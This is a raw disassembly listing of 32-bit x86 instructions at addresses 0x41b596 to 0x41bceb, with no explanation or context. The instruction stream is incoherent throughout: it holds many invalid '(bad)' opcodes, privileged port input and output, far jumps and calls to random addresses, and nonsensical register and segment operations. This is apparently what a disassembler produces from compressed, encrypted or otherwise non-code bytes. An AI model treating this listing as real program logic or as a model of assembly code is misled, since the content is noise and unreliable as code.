  41b596:	je     0x41b58f
  41b598:	push   eax
  41b599:	fs retf 0x6ff0
  41b59d:	hlt    
  41b59e:	push   ebp
  41b59f:	push   ds
  41b5a0:	sbb    BYTE PTR [eax-0x15],bl
  41b5a3:	leave  
  41b5a4:	jmp    0x41b5e1
  41b5a6:	pop    es
  41b5a7:	jno    0x41b541
  41b5a9:	pop    es
  41b5aa:	cmp    BYTE PTR [ebx+0x22],al
  41b5ad:	jbe    0x41b585
  41b5af:	das    
  41b5b0:	jb     0x41b546
  41b5b2:	sar    DWORD PTR [ecx],cl
  41b5b4:	xchg   ebx,eax
  41b5b5:	inc    ebp
  41b5b6:	std    
  41b5b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5b8:	repz pusha 
  41b5ba:	adc    bh,BYTE PTR ds:0x2538929a
  41b5c0:	repz mov ch,0x86
  41b5c3:	sub    DWORD PTR [edx],0xec45fa03
  41b5c9:	pop    edx
  41b5ca:	mov    esp,0x8385c2b3
  41b5cf:	jnp    0x41b5e1
  41b5d1:	cmp    DWORD PTR [esi-0x557f4dc3],edi
  41b5d7:	(bad)  
  41b5d8:	mov    bl,0xc6
  41b5da:	cdq    
  41b5db:	lahf   
  41b5dc:	cmp    BYTE PTR ds:0x27a6aaee,bl
  41b5e2:	adc    eax,0xbc0cfba5
  41b5e7:	and    al,0x2b
  41b5e9:	xchg   BYTE PTR [ebp+0x6c],cl
  41b5ec:	xlat   BYTE PTR ds:[ebx]
  41b5ed:	add    eax,0xeb7eedbb
  41b5f2:	dec    esp
  41b5f3:	(bad)  
  41b5f4:	cmp    bl,BYTE PTR [ecx-0x5b]
  41b5f7:	mov    edi,0x6197f5f
  41b5fc:	inc    esi
  41b5fd:	rol    BYTE PTR [esi],1
  41b5ff:	cmp    eax,0xe3f00a4b
  41b604:	mov    eax,ds:0x355a401d
  41b609:	adc    DWORD PTR [edx-0x5c2c5ec7],esp
  41b60f:	and    bh,BYTE PTR [eax+0x535aa95c]
  41b615:	mul    BYTE PTR [ebx+0x1506dc7a]
  41b61b:	jmp    0xd76c:0x1f7066c5
  41b622:	xor    DWORD PTR ds:0xfb19b449,esi
  41b628:	xor    eax,0xffffffc0
  41b62b:	cmp    edx,DWORD PTR [edi-0x33a9611d]
  41b631:	sub    BYTE PTR [edx-0x12],dh
  41b634:	xor    esi,edx
  41b636:	mov    ebx,0x2e22fa0e
  41b63b:	mov    ecx,0xca62624f
  41b640:	(bad)  
  41b641:	lock sub DWORD PTR [esi-0x7f4f9d03],eax
  41b648:	dec    ebx
  41b649:	pop    ecx
  41b64a:	out    dx,eax
  41b64b:	pop    ebx
  41b64c:	jo     0x41b667
  41b64e:	mov    gs,WORD PTR [edx]
  41b650:	mov    WORD PTR [eax-0x356b92a8],ds
  41b656:	inc    esp
  41b657:	sbb    BYTE PTR [esp+ebx*8],dh
  41b65a:	bound  edx,QWORD PTR [ebx-0x415d16ef]
  41b660:	hlt    
  41b661:	aad    0x7
  41b663:	cwde   
  41b664:	mov    esp,0x87ae83e
  41b669:	adc    ebp,DWORD PTR [ecx+ecx*1+0x1d]
  41b66d:	or     DWORD PTR [ebp-0x75],eax
  41b670:	push   0x891b90c2
  41b675:	dec    edx
  41b676:	call   0xf1ce1369
  41b67b:	cmp    dl,BYTE PTR [edi-0x3d6b2d76]
  41b681:	mov    bl,0x67
  41b683:	jmp    0x41b6b7
  41b685:	cmp    dh,ch
  41b687:	mov    cl,bl
  41b689:	push   esp
  41b68a:	and    eax,0xc7f7bc8a
  41b68f:	js     0x41b6b2
  41b691:	push   ecx
  41b692:	mov    eax,0xe2dfc04c
  41b697:	fwait
  41b698:	pusha  
  41b699:	inc    esi
  41b69a:	fs bnd jg 0x41b66b
  41b69e:	clc    
  41b69f:	iret   
  41b6a0:	in     al,0xbf
  41b6a2:	xchg   esp,eax
  41b6a3:	xor    eax,0xbf551912
  41b6a8:	aad    0x62
  41b6aa:	cwde   
  41b6ab:	jnp    0x41b727
  41b6ad:	xor    BYTE PTR [eax],bl
  41b6af:	fdiv   st,st(4)
  41b6b1:	rol    BYTE PTR [eax],0x7b
  41b6b4:	pop    ebx
  41b6b5:	push   ecx
  41b6b6:	fisubr DWORD PTR [ebx]
  41b6b8:	or     esp,DWORD PTR [ecx]
  41b6ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6bb:	shl    DWORD PTR [ebx+0x3c73280b],1
  41b6c1:	push   ebx
  41b6c2:	mov    ebx,0xbd9fdcb6
  41b6c7:	mov    dl,0x75
  41b6c9:	clc    
  41b6ca:	dec    edx
  41b6cb:	mov    al,ds:0x237a94b8
  41b6d0:	clc    
  41b6d1:	dec    ebp
  41b6d2:	lea    edx,[ebx+0x3aff6f92]
  41b6d8:	int    0xe4
  41b6da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6db:	frstpm(287 only) 
  41b6dd:	cmp    eax,0x18fd8a0e
  41b6e2:	pop    ebx
  41b6e3:	ret    
  41b6e4:	cwde   
  41b6e5:	jo     0x41b695
  41b6e7:	popf   
  41b6e8:	xor    eax,0x828d5664
  41b6ed:	sub    edx,DWORD PTR [eax+0x51]
  41b6f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6f1:	xor    DWORD PTR [edi],esi
  41b6f3:	aam    0x46
  41b6f5:	dec    ecx
  41b6f6:	out    0xaf,eax
  41b6f8:	outs   dx,BYTE PTR ds:[esi]
  41b6f9:	jge    0x41b6ed
  41b6fb:	das    
  41b6fc:	cwde   
  41b6fd:	fwait
  41b6fe:	stos   BYTE PTR es:[edi],al
  41b6ff:	xor    esi,DWORD PTR [ebx+0x3a]
  41b702:	mov    dh,0x11
  41b704:	ds or  ebp,ebx
  41b707:	xlat   BYTE PTR ds:[ebx]
  41b708:	xor    al,BYTE PTR [ebp-0x5c]
  41b70b:	xchg   ebx,eax
  41b70c:	mov    cl,BYTE PTR [ebp+0x43]
  41b70f:	mov    dh,0x2e
  41b711:	mov    edx,0x543e7b50
  41b716:	jno    0x41b69d
  41b718:	(bad)  
  41b719:	icebp  
  41b71a:	aam    0x48
  41b71c:	ss jo  0x41b704
  41b71f:	mov    WORD PTR [ecx],ds
  41b721:	fbld   TBYTE PTR [ecx+ebp*1]
  41b724:	lahf   
  41b725:	fwait
  41b726:	gs inc esp
  41b728:	mov    bh,0xe9
  41b72a:	push   esi
  41b72b:	adc    al,0x23
  41b72d:	repz (bad) 
  41b72f:	frstor [esi-0x6aa14310]
  41b735:	clc    
  41b736:	inc    edi
  41b737:	cs push ds
  41b739:	and    ebp,DWORD PTR [esp+esi*4+0x2769dcdb]
  41b740:	inc    ebp
  41b741:	lods   eax,DWORD PTR ds:[esi]
  41b742:	push   esi
  41b743:	sub    ch,BYTE PTR [ebx+0x4fc4ba23]
  41b749:	inc    eax
  41b74a:	inc    bl
  41b74c:	outs   dx,DWORD PTR ds:[esi]
  41b74d:	push   edx
  41b74e:	or     ch,BYTE PTR [eax+0x2727a73f]
  41b754:	sbb    DWORD PTR [esi-0xac43935],ebx
  41b75a:	or     ebp,0x8
  41b75d:	push   eax
  41b75e:	ss push ss
  41b760:	int3   
  41b761:	(bad)  
  41b762:	push   ebp
  41b763:	ss test al,0xc1
  41b766:	mov    cl,0xc8
  41b768:	push   cs
  41b769:	inc    eax
  41b76a:	cmp    BYTE PTR [edi],0xfb
  41b76d:	jb     0x41b6fb
  41b76f:	fisub  WORD PTR [esi]
  41b771:	mov    DWORD PTR [ecx+0x43],esp
  41b774:	mov    ch,0xd4
  41b776:	(bad)  
  41b777:	jle    0x41b7ab
  41b779:	pushf  
  41b77a:	fst    QWORD PTR [esi]
  41b77c:	and    BYTE PTR [esi+0x2b],ch
  41b77f:	xchg   ecx,eax
  41b780:	out    dx,al
  41b781:	xlat   BYTE PTR ds:[ebx]
  41b782:	inc    ebp
  41b783:	test   DWORD PTR [ebp+0x37],0xdf5cb73e
  41b78a:	xor    BYTE PTR [ebx-0xa020c57],cl
  41b790:	pop    ss
  41b791:	or     BYTE PTR [ebp+0x3e],bh
  41b794:	and    eax,0x5ee1fd97
  41b799:	pop    ds
  41b79a:	xor    dl,bh
  41b79c:	pop    es
  41b79d:	fldenv [ecx+0x4f]
  41b7a0:	and    DWORD PTR [ebx+0x630e28b0],0x42
  41b7a7:	mov    eax,0xea0efccd
  41b7ac:	cs lock inc esp
  41b7af:	push   esi
  41b7b0:	push   ebp
  41b7b1:	aaa    
  41b7b2:	and    BYTE PTR [eax-0x341aee95],dh
  41b7b8:	cld    
  41b7b9:	xchg   bh,dh
  41b7bb:	test   al,0x89
  41b7bd:	ss push eax
  41b7bf:	adc    BYTE PTR [edx],0xc9
  41b7c2:	sbb    bl,ah
  41b7c4:	add    eax,DWORD PTR [ebp+0x109e0752]
  41b7ca:	sub    DWORD PTR [ebp+0x60],ebx
  41b7cd:	adc    DWORD PTR [esi],eax
  41b7cf:	fwait
  41b7d0:	dec    ebp
  41b7d1:	xchg   ebx,eax
  41b7d2:	daa    
  41b7d3:	in     eax,0x2f
  41b7d5:	fbstp  TBYTE PTR [ecx]
  41b7d7:	call   0xd4cf7927
  41b7dc:	popf   
  41b7dd:	sub    BYTE PTR [ecx],bh
  41b7df:	xchg   ebp,eax
  41b7e0:	jns    0x41b79e
  41b7e2:	clc    
  41b7e3:	in     al,0xef
  41b7e5:	and    eax,DWORD PTR [ecx-0x5]
  41b7e8:	dec    esi
  41b7e9:	jmp    0x41b80e
  41b7eb:	ss mov esp,0x2ce7f202
  41b7f1:	sbb    DWORD PTR [ebp+edi*2+0x578441b4],esi
  41b7f8:	inc    ecx
  41b7f9:	fs das 
  41b7fb:	sbb    BYTE PTR [ebp-0x74],0x9a
  41b7ff:	cdq    
  41b800:	add    eax,0x4b59e5d4
  41b805:	cmp    DWORD PTR [edi-0x3b553a01],edx
  41b80b:	loop   0x41b7a4
  41b80d:	dec    esi
  41b80e:	xchg   edi,eax
  41b80f:	retf   
  41b810:	cli    
  41b811:	adc    ebp,DWORD PTR ss:[edx+0x1b]
  41b815:	cmp    DWORD PTR [edi-0x179e61d0],ecx
  41b81b:	lock push ss
  41b81d:	lea    esp,[ebx]
  41b81f:	int3   
  41b820:	jno    0x41b811
  41b822:	cmc    
  41b823:	(bad)  
  41b825:	enter  0x5082,0x7b
  41b829:	push   ebp
  41b82a:	fwait
  41b82b:	add    esi,edi
  41b82d:	(bad)  
  41b82e:	fdiv   st,st(1)
  41b830:	mov    ecx,0x36611ae6
  41b835:	inc    eax
  41b836:	ud0    esi,DWORD PTR [ebx-0x286fff81]
  41b83d:	sbb    DWORD PTR [ebp-0x5357c5dd],ebx
  41b843:	popf   
  41b844:	loopne 0x41b8a6
  41b846:	pop    ss
  41b847:	stc    
  41b848:	outs   dx,BYTE PTR ds:[esi]
  41b849:	(bad)  
  41b84a:	loope  0x41b839
  41b84c:	in     ax,0xe9
  41b84f:	jp     0x41b84c
  41b851:	(bad)  
  41b852:	push   ss
  41b853:	adc    eax,0x5881bf8a
  41b858:	shl    DWORD PTR [edi+edx*8+0x4f],1
  41b85c:	lds    ebx,FWORD PTR [ebx+eax*8+0x79]
  41b860:	cld    
  41b861:	(bad)  
  41b862:	cli    
  41b863:	mov    ebp,0x9de42eff
  41b868:	jmp    0x41b8dd
  41b86a:	out    dx,eax
  41b86b:	(bad)  
  41b86c:	jbe    0x41b7f4
  41b86e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b86f:	(bad)  
  41b870:	std    
  41b871:	jecxz  0x41b874
  41b873:	push   esp
  41b874:	push   eax
  41b875:	push   ebx
  41b876:	clc    
  41b877:	cmp    dl,0xf3
  41b87a:	jns    0x41b845
  41b87c:	adc    DWORD PTR [ecx],0x26
  41b87f:	push   ds
  41b880:	idiv   ah
  41b882:	jp     0x41b813
  41b884:	in     eax,dx
  41b885:	jae    0x41b853
  41b887:	rcr    ch,0xf2
  41b88a:	sub    dh,BYTE PTR [eax]
  41b88c:	push   ebx
  41b88d:	das    
  41b88e:	mov    al,0xf2
  41b890:	inc    esp
  41b891:	jns    0x41b8bc
  41b893:	out    0xc3,al
  41b895:	stos   DWORD PTR es:[edi],eax
  41b896:	das    
  41b897:	repz shl DWORD PTR [eax],0x12
  41b89b:	push   cs
  41b89c:	jle    0x41b88b
  41b89e:	add    al,0xaf
  41b8a0:	pop    ecx
  41b8a1:	or     ch,BYTE PTR [esi+0x60bb8b07]
  41b8a7:	pop    ebx
  41b8a8:	out    0x9,eax
  41b8aa:	mov    ecx,0xcb48fb99
  41b8af:	ret    
  41b8b0:	cmp    BYTE PTR cs:[ecx+0x22e6c639],cl
  41b8b7:	in     eax,dx
  41b8b8:	jle    0x41b90f
  41b8ba:	je     0x41b903
  41b8bc:	push   eax
  41b8bd:	sbb    edi,DWORD PTR [ecx]
  41b8bf:	xchg   BYTE PTR [eax],bh
  41b8c1:	nop
  41b8c2:	push   eax
  41b8c3:	popf   
  41b8c4:	test   eax,0xb89505b5
  41b8c9:	ret    
  41b8ca:	ds cmc 
  41b8cc:	mov    eax,0x7d23141f
  41b8d1:	pop    esi
  41b8d2:	push   edi
  41b8d3:	nop
  41b8d4:	dec    eax
  41b8d5:	xchg   ebp,eax
  41b8d6:	loope  0x41b88d
  41b8d8:	(bad)  
  41b8da:	xchg   ecx,eax
  41b8db:	jmp    0x768127e9
  41b8e0:	in     eax,0x3d
  41b8e2:	add    BYTE PTR [ecx+0x42deadb3],bh
  41b8e8:	xor    al,0x25
  41b8ea:	add    al,BYTE PTR [edx+esi*2-0x1f]
  41b8ee:	push   ss
  41b8ef:	(bad)  
  41b8f0:	shl    DWORD PTR [ecx],1
  41b8f2:	lahf   
  41b8f3:	xor    eax,0x536a3160
  41b8f8:	xlat   BYTE PTR ds:[ebx]
  41b8f9:	repz fnstenv [edx]
  41b8fc:	jle    0x41b95c
  41b8fe:	xchg   edx,eax
  41b8ff:	gs dec esi
  41b901:	sbb    ebp,DWORD PTR [ecx+0x2b]
  41b904:	inc    eax
  41b905:	sub    ebp,ebp
  41b907:	imul   esp,DWORD PTR [edx+0x28],0x20
  41b90b:	mov    bl,0xb
  41b90d:	or     BYTE PTR [ecx+edi*1+0x52],ch
  41b911:	aas    
  41b912:	int3   
  41b913:	xor    bl,BYTE PTR [ebx+edx*4+0x6e]
  41b917:	add    ch,cl
  41b919:	xor    al,0x43
  41b91b:	jb     0x41b950
  41b91d:	sti    
  41b91e:	push   eax
  41b91f:	loopne 0x41b975
  41b921:	push   0xe1e3da8f
  41b926:	sub    BYTE PTR [ecx],ah
  41b928:	push   edx
  41b929:	sub    al,0xf1
  41b92b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b92c:	jo     0x41b909
  41b92e:	fcomi  st,st(3)
  41b930:	(bad)  
  41b931:	jmp    0xdcf6eda2
  41b936:	fimul  WORD PTR [edx+ebp*8]
  41b939:	out    dx,al
  41b93a:	les    edi,FWORD PTR [eiz*1+0x86c17d]
  41b941:	dec    edx
  41b942:	cmc    
  41b943:	ret    
  41b944:	and    BYTE PTR [eax-0x9],ah
  41b947:	dec    edx
  41b948:	inc    esi
  41b949:	mov    eax,DWORD PTR [ebp-0x45]
  41b94c:	pusha  
  41b94d:	pop    edi
  41b94e:	icebp  
  41b94f:	lods   al,BYTE PTR cs:[esi]
  41b951:	aaa    
  41b952:	arpl   WORD PTR [edx+ecx*2+0x40],ax
  41b956:	mov    ebx,0x40a09cdd
  41b95b:	je     0x41b90d
  41b95d:	jmp    0x41b920
  41b95f:	loop   0x41b918
  41b961:	push   ds
  41b962:	ins    BYTE PTR es:[edi],dx
  41b963:	xlat   BYTE PTR ds:[ebx]
  41b964:	test   eax,0x4cc82d88
  41b969:	loop   0x41b8fe
  41b96b:	inc    ebp
  41b96c:	je     0x41b983
  41b96e:	out    0x72,eax
  41b970:	enter  0xc4c1,0x34
  41b974:	jns    0x41b90f
  41b976:	mov    WORD PTR [ebp+0x39],gs
  41b979:	push   edx
  41b97a:	cmp    bl,BYTE PTR [eax]
  41b97c:	ret    
  41b97d:	inc    ebx
  41b97e:	xchg   ebp,eax
  41b97f:	enter  0xb260,0x62
  41b983:	push   0x48
  41b985:	add    edx,DWORD PTR [ebx]
  41b987:	repnz gs or eax,0xbe3ba58c
  41b98e:	push   ss
  41b98f:	repz adc BYTE PTR [eax-0x129260eb],ch
  41b996:	ss push esi
  41b998:	adc    ebp,eax
  41b99a:	sub    al,0x4
  41b99d:	data16 mov dh,0x7b
  41b9a0:	ins    BYTE PTR es:[edi],dx
  41b9a1:	add    esp,esi
  41b9a3:	sbb    al,0xa6
  41b9a5:	push   edx
  41b9a6:	out    dx,eax
  41b9a7:	fcomi  st,st(4)
  41b9a9:	aas    
  41b9aa:	pusha  
  41b9ab:	jno    0x41b9a4
  41b9ad:	mov    dl,0xcd
  41b9af:	pop    ebx
  41b9b0:	dec    eax
  41b9b1:	add    ecx,DWORD PTR [esi+0x5edaf2ac]
  41b9b7:	pop    esi
  41b9b8:	adc    ecx,DWORD PTR [esi]
  41b9ba:	stos   DWORD PTR es:[edi],eax
  41b9bb:	push   ss
  41b9bc:	cmc    
  41b9bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b9be:	mov    al,0xdf
  41b9c0:	xchg   edx,eax
  41b9c1:	push   0xccfad8d9
  41b9c6:	dec    ebx
  41b9c7:	dec    esp
  41b9c8:	add    DWORD PTR [edi],eax
  41b9ca:	daa    
  41b9cb:	xchg   ebx,eax
  41b9cc:	ins    BYTE PTR es:[edi],dx
  41b9cd:	icebp  
  41b9ce:	loope  0x41b9f7
  41b9d0:	pop    edi
  41b9d1:	add    al,0xd5
  41b9d3:	or     DWORD PTR [edi+0x27],0x6efef369
  41b9da:	and    dh,BYTE PTR [ecx]
  41b9dc:	cmp    DWORD PTR [eax+0xf96bb61],esi
  41b9e2:	push   0x7
  41b9e4:	out    dx,al
  41b9e5:	or     cl,ah
  41b9e7:	cmp    eax,0x79d8999f
  41b9ec:	stc    
  41b9ed:	jp     0x41ba27
  41b9ef:	aas    
  41b9f0:	cs xchg ecx,eax
  41b9f2:	daa    
  41b9f3:	and    eax,0xf5f21e05
  41b9f8:	(bad)
  41b9fc:	stc    
  41b9fd:	inc    eax
  41b9fe:	lea    ecx,[ebx]
  41ba00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba01:	retf   
  41ba02:	or     DWORD PTR [esi+0x55],edi
  41ba05:	xor    BYTE PTR [edi-0x15],ch
  41ba08:	ror    ch,cl
  41ba0a:	(bad)  
  41ba0b:	fdiv   DWORD PTR [ecx]
  41ba0d:	pop    es
  41ba0e:	sub    eax,0xc2913c89
  41ba13:	sub    DWORD PTR [edi+0x55ae79a],edi
  41ba19:	stos   BYTE PTR es:[edi],al
  41ba1a:	dec    ebx
  41ba1b:	test   eax,0xd7b99b89
  41ba20:	imul   ebp,DWORD PTR [eax-0x506442ca],0xe18fdf4b
  41ba2a:	stc    
  41ba2b:	jnp    0x41ba1a
  41ba2d:	xor    bl,bl
  41ba2f:	inc    eax
  41ba30:	cs sti 
  41ba32:	mov    ah,0x35
  41ba34:	pop    edi
  41ba35:	stc    
  41ba36:	cmp    al,0x11
  41ba38:	xchg   ecx,eax
  41ba39:	dec    edi
  41ba3a:	push   ds
  41ba3b:	in     eax,0x6b
  41ba3d:	ins    DWORD PTR es:[edi],dx
  41ba3e:	pusha  
  41ba3f:	popf   
  41ba40:	xor    eax,0x18a518c0
  41ba45:	add    BYTE PTR [ebx+0x7a0a5d52],bh
  41ba4b:	add    BYTE PTR [ebx-0x3a],cl
  41ba4e:	std    
  41ba4f:	jno    0x41ba9a
  41ba51:	sbb    eax,DWORD PTR [ebp+0x37]
  41ba54:	addps  xmm6,XMMWORD PTR [eax]
  41ba57:	dec    esp
  41ba58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba59:	dec    ebp
  41ba5a:	or     al,0xaa
  41ba5c:	push   ebx
  41ba5d:	add    eax,0x20048c94
  41ba62:	lods   eax,DWORD PTR ds:[esi]
  41ba63:	or     WORD PTR [edx-0x26],si
  41ba67:	cli    
  41ba68:	out    dx,al
  41ba69:	mov    bh,0x5e
  41ba6b:	stos   DWORD PTR es:[edi],eax
  41ba6c:	pop    es
  41ba6d:	add    DWORD PTR [esi-0x755ca3a1],ecx
  41ba73:	sub    al,0x6b
  41ba75:	arpl   WORD PTR [eax],bx
  41ba77:	mov    esi,0x65dc5bdc
  41ba7c:	data16 and al,0x1d
  41ba7f:	inc    esi
  41ba80:	leave  
  41ba81:	jge    0x41ba35
  41ba83:	data16 repz fmul QWORD PTR [ecx-0x328d4ea7]
  41ba8b:	mov    edi,0xceded0fd
  41ba90:	pop    edi
  41ba91:	dec    ebx
  41ba92:	hlt    
  41ba93:	cmp    eax,0xdeed081f
  41ba98:	pop    ecx
  41ba99:	frstor [ecx+0x74]
  41ba9c:	add    edi,DWORD PTR [edx+0x3f75a251]
  41baa2:	inc    ecx
  41baa3:	cmp    BYTE PTR [esi-0xd],bl
  41baa6:	xchg   edi,eax
  41baa7:	inc    esi
  41baa8:	mov    ds:0x1a27d621,al
  41baad:	jae    0x41bb24
  41baaf:	mov    DWORD PTR [esi+edx*2+0x78],ebx
  41bab3:	pop    ecx
  41bab4:	fst    DWORD PTR [esi+edx*2+0x6c]
  41bab8:	jle    0x41bb22
  41baba:	mov    dh,0x64
  41babc:	fabs   
  41babe:	push   ss
  41babf:	aas    
  41bac0:	mov    ebx,0x3badbfb5
  41bac5:	xchg   ebp,eax
  41bac6:	test   DWORD PTR [esi-0x7c],ecx
  41bac9:	sbb    DWORD PTR [edi+0x7e3565b4],eax
  41bacf:	fs mov esp,0x4c7e1358
  41bad5:	pop    esp
  41bad6:	repz jg 0x41bb48
  41bad9:	mov    BYTE PTR [ebx+esi*1-0xe47d9c6],ch
  41bae0:	and    WORD PTR [eax+0x46],si
  41bae4:	in     eax,0xc
  41bae6:	call   0x986b:0x50b3f31f
  41baed:	cs dec eax
  41baef:	pop    ebx
  41baf0:	push   cs
  41baf1:	and    DWORD PTR [edx+0x66],0x43
  41baf5:	mov    esi,0xdcf04f3d
  41bafa:	or     edx,ecx
  41bafc:	pop    ebp
  41bafd:	in     al,dx
  41bafe:	jbe    0x41bb30
  41bb00:	gs call 0xe6d7:0x5823466d
  41bb08:	sub    BYTE PTR [esp+esi*1],al
  41bb0b:	push   ss
  41bb0c:	mov    bh,BYTE PTR [ecx+0xce5e9c5]
  41bb12:	push   ebp
  41bb13:	mov    ecx,0xfb50084
  41bb18:	mov    eax,ds:0xc04cb756
  41bb1d:	fst    QWORD PTR [ebx]
  41bb1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb20:	pop    ecx
  41bb21:	sbb    DWORD PTR [esi+0x32],edx
  41bb24:	mov    WORD PTR [esi],?
  41bb26:	mov    es,WORD PTR [ecx]
  41bb28:	sub    BYTE PTR [eax+ebx*4],bh
  41bb2b:	inc    esi
  41bb2c:	mov    eax,0x49f06073
  41bb31:	push   cs
  41bb32:	bound  eax,QWORD PTR [esp+edx*2]
  41bb35:	pop    es
  41bb36:	mov    ds:0xfc4b757f,eax
  41bb3b:	push   es
  41bb3c:	ins    DWORD PTR es:[edi],dx
  41bb3d:	xchg   DWORD PTR [eax-0x4e],edi
  41bb40:	sahf   
  41bb41:	icebp  
  41bb42:	inc    ebp
  41bb43:	mov    bh,dh
  41bb45:	jle    0x41bb93
  41bb47:	(bad)  
  41bb48:	ds sbb ebx,edi
  41bb4b:	adc    eax,DWORD PTR [edi+esi*8+0x1e5d4ed8]
  41bb52:	add    eax,0x48c52fec
  41bb57:	jbe    0x41baee
  41bb59:	mov    eax,0x3cba04bf
  41bb5e:	int3   
  41bb5f:	jge    0x41bb9c
  41bb61:	lea    edi,[edx]
  41bb63:	or     DWORD PTR [edx-0x72],0xffffffac
  41bb67:	dec    edi
  41bb68:	(bad)  
  41bb69:	fstp   st(0)
  41bb6b:	xchg   ebp,eax
  41bb6c:	sub    ah,BYTE PTR [edx+0x2b]
  41bb6f:	fs pushf 
  41bb71:	cmp    al,0x9b
  41bb73:	cmp    DWORD PTR [esi-0x23],ebx
  41bb76:	pop    ss
  41bb77:	jg     0x41bb12
  41bb79:	cmp    eax,0xe6804034
  41bb7e:	dec    edx
  41bb7f:	in     al,dx
  41bb80:	imul   esp,DWORD PTR [eax+edi*8-0x1f],0xffffffcb
  41bb85:	or     eax,0xcf81c6b1
  41bb8a:	(bad)  
  41bb8b:	mov    ah,BYTE PTR [edx+0x2b]
  41bb8e:	push   es
  41bb8f:	mov    ebx,0x4fb68b5d
  41bb94:	leave  
  41bb95:	call   DWORD PTR [edx]
  41bb97:	xchg   DWORD PTR [edx+0x4443e933],eax
  41bb9d:	mov    BYTE PTR [eax],ah
  41bb9f:	retf   0x3e40
  41bba2:	cmp    al,0x80
  41bba4:	out    0x87,al
  41bba6:	(bad)  
  41bba7:	jb     0x41bb78
  41bba9:	add    edx,DWORD PTR ds:0x43168916
  41bbaf:	xor    dl,BYTE PTR [ecx+edx*1]
  41bbb2:	push   edx
  41bbb3:	outs   dx,DWORD PTR ds:[esi]
  41bbb4:	pop    edx
  41bbb5:	xor    al,BYTE PTR [ebx+0x60f7338d]
  41bbbb:	fstp   TBYTE PTR [ebx]
  41bbbd:	iret   
  41bbbe:	retf   
  41bbbf:	cdq    
  41bbc0:	arpl   WORD PTR [esp+eiz*4+0x34e76fa],dx
  41bbc7:	int3   
  41bbc8:	(bad)  
  41bbc9:	in     al,dx
  41bbca:	popf   
  41bbcb:	mov    ecx,0xa3dbc3a
  41bbd0:	mov    bh,0xf0
  41bbd2:	cmp    cl,ch
  41bbd4:	out    dx,eax
  41bbd5:	cmp    dl,dh
  41bbd7:	into   
  41bbd8:	ins    DWORD PTR es:[edi],dx
  41bbd9:	cmp    edi,DWORD PTR [edi+0x4d764463]
  41bbdf:	addr16 inc edx
  41bbe1:	adc    esi,DWORD PTR [edx+0x283f4b2d]
  41bbe7:	push   eax
  41bbe8:	sbb    eax,0xa2ef725
  41bbed:	inc    eax
  41bbee:	ficom  DWORD PTR [edi-0x1680d4be]
  41bbf4:	aas    
  41bbf5:	mov    ch,BYTE PTR [edx+0x2a278f1c]
  41bbfb:	and    BYTE PTR [edx+0x10],al
  41bbfe:	ret    
  41bbff:	(bad)  
  41bc00:	repz ss call 0x37cb:0x399f3da9
  41bc09:	mov    ch,0xb1
  41bc0b:	and    DWORD PTR [ecx+eiz*2],0xb96f9a49
  41bc12:	scas   eax,DWORD PTR es:[edi]
  41bc13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc14:	sti    
  41bc15:	rol    DWORD PTR gs:[esi-0x27],1
  41bc19:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41bc1b:	mov    cl,0x24
  41bc1d:	xchg   ebx,eax
  41bc1e:	xor    cl,0x6e
  41bc21:	xor    eax,0xb5e2409c
  41bc26:	dec    eax
  41bc27:	out    0xad,eax
  41bc29:	es in  al,0xee
  41bc2c:	push   ds
  41bc2d:	mov    ds:0x69cbd6f,eax
  41bc32:	add    al,0x20
  41bc34:	imul   edi,DWORD PTR [edx+0x8],0xffffffb1
  41bc38:	cmp    eax,0x88d25c2c
  41bc3d:	xor    eax,0x6012c12a
  41bc42:	sub    DWORD PTR [eax-0x6b7d794e],0x5c0cebfa
  41bc4c:	jecxz  0x41bc06
  41bc4e:	test   DWORD PTR ds:0xfb46a796,edx
  41bc54:	pop    esp
  41bc55:	shl    bl,cl
  41bc57:	rol    ecx,1
  41bc59:	loop   0x41bc54
  41bc5b:	mov    bl,0x34
  41bc5d:	shld   DWORD PTR [edx-0x644d6043],ebp,0x45
  41bc65:	stos   BYTE PTR es:[edi],al
  41bc66:	lock inc ebx
  41bc68:	ins    DWORD PTR es:[edi],dx
  41bc69:	jmp    0x53389c84
  41bc6e:	push   esi
  41bc6f:	lock test eax,0x45c9befa
  41bc75:	push   ss
  41bc76:	mov    ebx,0x9b195623
  41bc7b:	sub    BYTE PTR [esi-0x493c81ec],al
  41bc81:	sti    
  41bc82:	mov    eax,ds:0x64bb898f
  41bc87:	imul   ecx,ebp,0xea146d22
  41bc8d:	sti    
  41bc8e:	jmp    0xd4fbb2cd
  41bc93:	in     al,0x4a
  41bc95:	xchg   ebx,eax
  41bc96:	add    al,0x9a
  41bc98:	mov    WORD PTR [edx],ds
  41bc9a:	cmc    
  41bc9b:	test   eax,0xc5fbab98
  41bca0:	mov    ah,0x9d
  41bca2:	repz ds mov eax,0x9f88187f
  41bca9:	push   ebx
  41bcaa:	scas   eax,DWORD PTR es:[edi]
  41bcab:	in     al,0x2d
  41bcad:	test   eax,0x486278b8
  41bcb2:	push   edx
  41bcb3:	add    eax,DWORD PTR [edx-0x79b0c809]
  41bcb9:	arpl   WORD PTR [edx],cx
  41bcbb:	pop    ecx
  41bcbc:	or     al,0x1f
  41bcbe:	sub    BYTE PTR [eax+0x456c6cc],ch
  41bcc4:	adc    BYTE PTR [ebp-0x67],bl
  41bcc7:	jns    0x41bcc6
  41bcc9:	jo     0x41bd28
  41bccb:	push   ecx
  41bccc:	jb     0x41bd02
  41bcce:	mov    ecx,0xf20e75f8
  41bcd3:	in     al,0x94
  41bcd5:	xor    DWORD PTR [edi-0x48bdd82d],edx
  41bcdb:	pop    esp
  41bcdc:	je     0x41bc93
  41bcde:	dec    ebx
  41bcdf:	enter  0x655f,0x8c
  41bce3:	enter  0xeacb,0xb4
  41bce7:	cmp    al,0xc1
  41bce9:	scas   al,BYTE PTR es:[edi]
  41bcea:	leave  
  41bceb:	daa    
